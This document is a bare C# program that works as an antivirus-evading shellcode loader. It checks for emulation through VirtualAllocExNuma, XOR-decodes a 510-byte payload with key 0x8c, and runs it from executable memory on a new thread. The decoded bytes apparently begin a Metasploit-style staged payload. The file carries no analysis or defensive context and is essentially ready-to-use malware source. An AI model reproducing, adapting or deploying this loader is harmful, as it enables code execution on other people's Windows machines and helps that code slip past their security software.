using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.Xml.XPath;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            //Non-Emulated API
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

	    // Shellcode
byte[] buf = new byte[510] {0x70, 0xc4, 0x0f, 0x68, 0x7c, 0x64, 0x40, 0x8c, 0x8c, 0x8c, 0xcd, 0xdd, 0xcd, 0xdc, 0xde, 0xc4, 0xbd, 0x5e, 0xe9, 0xc4, 0x07, 0xde, 0xec, 0xc4, 0x07, 0xde, 0x94, 0xc4, 0x07, 0xde, 0xac, 0xdd, 0xda, 0xc1, 0xbd, 0x45, 0xc4, 0x07, 0xfe, 0xdc, 0xc4, 0x83, 0x3b, 0xc6, 0xc6, 0xc4, 0xbd, 0x4c, 0x20, 0xb0, 0xed, 0xf0, 0x8e, 0xa0, 0xac, 0xcd, 0x4d, 0x45, 0x81, 0xcd, 0x8d, 0x4d, 0x6e, 0x61, 0xde, 0xcd, 0xdd, 0xc4, 0x07, 0xde, 0xac, 0x07, 0xce, 0xb0, 0xc4, 0x8d, 0x5c, 0xea, 0x0d, 0xf4, 0x94, 0x87, 0x8e, 0x83, 0x09, 0xfe, 0x8c, 0x8c, 0x8c, 0x07, 0x0c, 0x04, 0x8c, 0x8c, 0x8c, 0xc4, 0x09, 0x4c, 0xf8, 0xeb, 0xc4, 0x8d, 0x5c, 0xdc, 0xc8, 0x07, 0xcc, 0xac, 0xc5, 0x8d, 0x5c, 0x07, 0xc4, 0x94, 0x6f, 0xda, 0xc1, 0xbd, 0x45, 0xc4, 0x73, 0x45, 0xcd, 0x07, 0xb8, 0x04, 0xc4, 0x8d, 0x5a, 0xc4, 0xbd, 0x4c, 0x20, 0xcd, 0x4d, 0x45, 0x81, 0xcd, 0x8d, 0x4d, 0xb4, 0x6c, 0xf9, 0x7d, 0xc0, 0x8f, 0xc0, 0xa8, 0x84, 0xc9, 0xb5, 0x5d, 0xf9, 0x54, 0xd4, 0xc8, 0x07, 0xcc, 0xa8, 0xc5, 0x8d, 0x5c, 0xea, 0xcd, 0x07, 0x80, 0xc4, 0xc8, 0x07, 0xcc, 0x90, 0xc5, 0x8d, 0x5c, 0xcd, 0x07, 0x88, 0x04, 0xc4, 0x8d, 0x5c, 0xcd, 0xd4, 0xcd, 0xd4, 0xd2, 0xd5, 0xd6, 0xcd, 0xd4, 0xcd, 0xd5, 0xcd, 0xd6, 0xc4, 0x0f, 0x60, 0xac, 0xcd, 0xde, 0x73, 0x6c, 0xd4, 0xcd, 0xd5, 0xd6, 0xc4, 0x07, 0x9e, 0x65, 0xc7, 0x73, 0x73, 0x73, 0xd1, 0xc5, 0x32, 0xfb, 0xff, 0xbe, 0xd3, 0xbf, 0xbe, 0x8c, 0x8c, 0xcd, 0xda, 0xc5, 0x05, 0x6a, 0xc4, 0x0d, 0x60, 0x2c, 0x8d, 0x8c, 0x8c, 0xc5, 0x05, 0x69, 0xc5, 0x30, 0x8e, 0x8c, 0x8d, 0x37, 0x4c, 0x24, 0xa1, 0x47, 0xcd, 0xd8, 0xc5, 0x05, 0x68, 0xc0, 0x05, 0x7d, 0xcd, 0x36, 0xc0, 0xfb, 0xaa, 0x8b, 0x73, 0x59, 0xc0, 0x05, 0x66, 0xe4, 0x8d, 0x8d, 0x8c, 0x8c, 0xd5, 0xcd, 0x36, 0xa5, 0x0c, 0xe7, 0x8c, 0x73, 0x59, 0xe6, 0x86, 0xcd, 0xd2, 0xdc, 0xdc, 0xc1, 0xbd, 0x45, 0xc1, 0xbd, 0x4c, 0xc4, 0x73, 0x4c, 0xc4, 0x05, 0x4e, 0xc4, 0x73, 0x4c, 0xc4, 0x05, 0x4d, 0xcd, 0x36, 0x66, 0x83, 0x53, 0x6c, 0x73, 0x59, 0xc4, 0x05, 0x4b, 0xe6, 0x9c, 0xcd, 0xd4, 0xc0, 0x05, 0x6e, 0xc4, 0x05, 0x75, 0xcd, 0x36, 0x15, 0x29, 0xf8, 0xed, 0x73, 0x59, 0x09, 0x4c, 0xf8, 0x86, 0xc5, 0x73, 0x42, 0xf9, 0x69, 0x64, 0x1f, 0x8c, 0x8c, 0x8c, 0xc4, 0x0f, 0x60, 0x9c, 0xc4, 0x05, 0x6e, 0xc1, 0xbd, 0x45, 0xe6, 0x88, 0xcd, 0xd4, 0xc4, 0x05, 0x75, 0xcd, 0x36, 0x8e, 0x55, 0x44, 0xd3, 0x73, 0x59, 0x0f, 0x74, 0x8c, 0xf2, 0xd9, 0xc4, 0x0f, 0x48, 0xac, 0xd2, 0x05, 0x7a, 0xe6, 0xcc, 0xcd, 0xd5, 0xe4, 0x8c, 0x9c, 0x8c, 0x8c, 0xcd, 0xd4, 0xc4, 0x05, 0x7e, 0xc4, 0xbd, 0x45, 0xcd, 0x36, 0xd4, 0x28, 0xdf, 0x69, 0x73, 0x59, 0xc4, 0x05, 0x4f, 0xc5, 0x05, 0x4b, 0xc1, 0xbd, 0x45, 0xc5, 0x05, 0x7c, 0xc4, 0x05, 0x56, 0xc4, 0x05, 0x75, 0xcd, 0x36, 0x8e, 0x55, 0x44, 0xd3, 0x73, 0x59, 0x0f, 0x74, 0x8c, 0xf1, 0xa4, 0xd4, 0xcd, 0xdb, 0xd5, 0xe4, 0x8c, 0xcc, 0x8c, 0x8c, 0xcd, 0xd4, 0xe6, 0x8c, 0xd6, 0xcd, 0x36, 0x87, 0xa3, 0x83, 0xbc, 0x73, 0x59, 0xdb, 0xd5, 0xcd, 0x36, 0xf9, 0xe2, 0xc1, 0xed, 0x73, 0x59, 0xc5, 0x73, 0x42, 0x65, 0xb0, 0x73, 0x73, 0x73, 0xc4, 0x8d, 0x4f, 0xc4, 0xa5, 0x4a, 0xc4, 0x09, 0x7a, 0xf9, 0x38, 0xcd, 0x73, 0x6b, 0xd4, 0xe6, 0x8c, 0xd5, 0xc5, 0x4b, 0x4e, 0x7c, 0x39, 0x2e, 0xda, 0x73, 0x59};
	    // End Shellcode


            // Decoding 
// XOR decoding
for (int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(buf[i] ^ 0x8c);
}
	    // End Decoding

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
